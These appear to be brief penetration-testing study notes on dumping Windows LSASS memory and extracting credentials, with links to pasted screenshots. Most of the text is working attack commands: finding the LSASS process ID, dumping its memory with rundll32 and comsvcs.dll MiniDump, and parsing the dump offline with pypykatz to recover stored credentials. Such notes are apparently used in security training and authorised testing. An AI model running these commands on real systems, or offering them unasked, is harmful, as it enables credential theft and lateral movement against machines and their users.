
Dumping LSASS
![[Pasted image 20240912095240.png]]
```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```
Finding LSASS PID
![[Pasted image 20240912095439.png]]```tasklist /svc```
![[Pasted image 20240912095525.png]]
```powershell-session
Get-Process lsass
```
![[Pasted image 20240912100152.png]]
```powershell-session
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
Extracting creds with pypykatz (mimikatz for linux)
![[Pasted image 20240912101335.png]]
```shell-session
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```




